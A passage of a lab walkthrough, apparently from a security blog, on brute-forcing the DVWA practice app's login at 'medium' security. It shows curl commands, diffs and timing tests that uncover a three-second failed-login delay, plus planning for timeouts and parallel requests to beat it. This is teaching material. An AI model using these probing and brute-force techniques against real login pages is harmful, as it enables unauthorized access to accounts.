&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# sed -i '/security/d' dvwa.cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Session Cookie" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-01.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, depending on the web server &amp;amp; its configuration, &lt;a href="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-13.png"&gt;it may respond slightly differently&lt;/a&gt; (in the &lt;a href="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-13.png"&gt;screenshot&lt;/a&gt;: &lt;code&gt;192.168.1.11&lt;/code&gt; is &lt;strong&gt;Nginx&lt;/strong&gt;,&lt;code&gt;192.168.1.22&lt;/code&gt; is &lt;strong&gt;Apache&lt;/strong&gt; &amp;amp; &lt;code&gt;192.168.1.44&lt;/code&gt; is &lt;strong&gt;IIS&lt;/strong&gt;). This is a possible method to fingerprint an IIS web server.&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Information.Gathering"&gt;&lt;/a&gt;
&lt;h2&gt;Information Gathering&lt;/h2&gt;

&lt;a name="Form.HTML.Code"&gt;&lt;/a&gt;
&lt;h3&gt;Form HTML Code&lt;/h3&gt;

&lt;p&gt;The first thing is, to try and find out what is different &lt;em&gt;(without looking at the server side PHP source code)&lt;/em&gt;. Using the same commands as before, let's see what the HTML code page is for the web form.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=medium' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body_padded&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;h1&amp;gt;Vulnerability: Brute Force&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;vulnerable_code_area&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;h2&amp;gt;Login&amp;lt;/h2&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;form &lt;span class="nv"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      Username:&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      Password:&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;AUTOCOMPLETE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;off&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;        &amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body_padded&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;div &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&amp;gt;You have logged in as &lt;span class="s1"&gt;'admin'&lt;/span&gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Form HTML Code" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-02.png" /&gt;&lt;/p&gt;

&lt;p&gt;Does not look too different from before, but let's check.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p' &amp;gt; low.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=medium' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p' &amp;gt; medium.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff {low,medium}.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Form HTML Code Check" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-03.png" /&gt;&lt;/p&gt;

&lt;p&gt;There is nothing different between the pages. Okay, now what happens if we compare responses when logging in incorrectly, with an invalid user credential?&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login' &amp;gt; low.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=medium' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login' &amp;gt; medium.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# !diff   #diff {low,medium}.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;91c91
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;         &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;View Help&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;popup_button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;javascript:popUp( '../../vulnerabilities/view_help.php?id=brute&amp;amp;security=low' )&amp;quot;&lt;/span&gt;&amp;gt; &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;View Source&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;popup_button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;javascript:popUp( '../../vulnerabilities/view_source.php?id=brute&amp;amp;security=low' )&amp;quot;&lt;/span&gt;&amp;gt; &amp;lt;div &lt;span class="nv"&gt;align&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;left&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;em&amp;gt;Username:&amp;lt;/em&amp;gt; admin&amp;lt;br /&amp;gt;&amp;lt;em&amp;gt;Security Level:&amp;lt;/em&amp;gt; low&amp;lt;br /&amp;gt;&amp;lt;em&amp;gt;PHPIDS:&amp;lt;/em&amp;gt; disabled&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;         &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;View Help&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;popup_button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;javascript:popUp( '../../vulnerabilities/view_help.php?id=brute&amp;amp;security=medium' )&amp;quot;&lt;/span&gt;&amp;gt; &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;View Source&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;popup_button&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;javascript:popUp( '../../vulnerabilities/view_source.php?id=brute&amp;amp;security=medium' )&amp;quot;&lt;/span&gt;&amp;gt; &amp;lt;div &lt;span class="nv"&gt;align&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;left&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;em&amp;gt;Username:&amp;lt;/em&amp;gt; admin&amp;lt;br /&amp;gt;&amp;lt;em&amp;gt;Security Level:&amp;lt;/em&amp;gt; medium&amp;lt;br /&amp;gt;&amp;lt;em&amp;gt;PHPIDS:&amp;lt;/em&amp;gt; disabled&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Low vs Medium" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-04.png" /&gt;&lt;/p&gt;

&lt;p&gt;Looking at just the output, other than the core DVWA information, there is &lt;strong&gt;not any difference in the brute force module displayed output&lt;/strong&gt;. However, making the request, there was a &lt;strong&gt;noticeable time difference in response times&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time curl -s -b 'security=low' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login' &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=low'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 13% cpu 0.058 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# for loop in {1..3}; do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt; &lt;span class="nb"&gt;time &lt;/span&gt;curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt;&amp;gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.01s user 0.00s system 0% cpu 3.065 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.01s user 0.00s system 0% cpu 3.041 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.01s user 0.00s system 0% cpu 3.058 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Cool Down" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-05.png" /&gt;&lt;/p&gt;

&lt;p&gt;It is clear that there is &lt;strong&gt;now a three second time delay&lt;/strong&gt; when trying to login with incorrect credentials. This by itself will not offer brute force protection; however, it might mean &lt;strong&gt;it will slow down the brute force speed, increasing the time needed for the attack&lt;/strong&gt;. The question is, will it also have the time delay on a successful login? Without a valid user credential to login as with, &lt;strong&gt;we cannot know this&lt;/strong&gt; (there is not a "register"/"sign up" page and we were not given any in our pretend scope). What we should now do is setup a cloned environment in a test lab (as the project is free and open source) and either look at the source code or login with our admin account. However, we are going to pretend it is a custom built application so we cannot duplicate the setup. We are also going to skip the "view source" function which is in-built to DVWA's core, allowing us to see how the module works.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Attack.Vectors"&gt;&lt;/a&gt;
&lt;h3&gt;Attack Vectors&lt;/h3&gt;

&lt;p&gt;There are &lt;strong&gt;two possible ways we can approach this&lt;/strong&gt; now. The first method, just as before, is the same brute force command, however, this time &lt;strong&gt;make sure the "timeout" value is able to cope with the additional wait delay&lt;/strong&gt; from DVWA (the 3 seconds cool down) as well as all the threads/system load produced. This means there could be a significant time increase to perform the brute force. &lt;strong&gt;Alternatively, what happens if we set the timeout value to be less than three seconds?&lt;/strong&gt; We would not be able to use a large number of threads (a larger thread count, means more requests, more requests result is the system working harder, therefore taking longer to process our request). This is a possible option and &lt;strong&gt;only an option because by using the rest of the site, all our requests take less than a second to load&lt;/strong&gt; (so it depends on the network connection speed and target performance), therefore &lt;strong&gt;we are assuming&lt;/strong&gt; (and taking an educated guess) that there would not be a delay with a valid login.&lt;/p&gt;

&lt;p&gt;So &lt;strong&gt;what happens if we make four requests, one after another&lt;/strong&gt;? This would mean request #2-#4 needs to be sent inside the three second cool down of request #1. Does request #4 only take three seconds to respond back or does it have to wait the additional time of the all the other request's cool down time too? We can find out by doing the following:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;date&lt;span class="p"&gt;;&lt;/span&gt; curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  curl -s -b &lt;span class="s1"&gt;'security=medium'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt;/dev/null &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; date
&lt;/span&gt;&lt;span class="line"&gt;sleep 30s
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;Before we execute this, I will explain what is happening (as it will get a little more complex when executed). All of this is a single "command" (even though it is on multiple lines, it is chained together). It can be broken down like so:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;date&lt;/code&gt; - This will display the date/time for our starting point.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt; - Once the previous command finishes, regardless of the exit code, run the next command.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl -s ...&lt;/code&gt; - Make an invalid login attempt to the target.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;- "background" the previous command, allowing the rest of the commands to keep on running without waiting.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\&lt;/code&gt; - instructs bash there is an additional line and not to execute the command just yet.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl...&lt;/code&gt; + &lt;code&gt;&amp;amp;&lt;/code&gt; - these are repeated another 3 times (requests #2-#4).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; - Signals to wait for the previous command to finish. If it was successful, to move onto the next command.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;date&lt;/code&gt; - Display the end date, when request #4 finishes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sleep 30s&lt;/code&gt; - Wait 30 seconds before doing the next loop. This is to allow all the other requests to finish.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Display the time before starting. On the 4th (and final?) request, display the time again after the cURL command finishes executing. Compare both timestamps.&lt;/p&gt;

&lt;p&gt;It is always &lt;strong&gt;good practice to repeat a test multiple times, to make sure the results are consistent&lt;/strong&gt; (Let's forget: &lt;em&gt;"Insanity: doing the same thing over and over again and expecting different results." ~ Albert Einstein&lt;/em&gt;).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
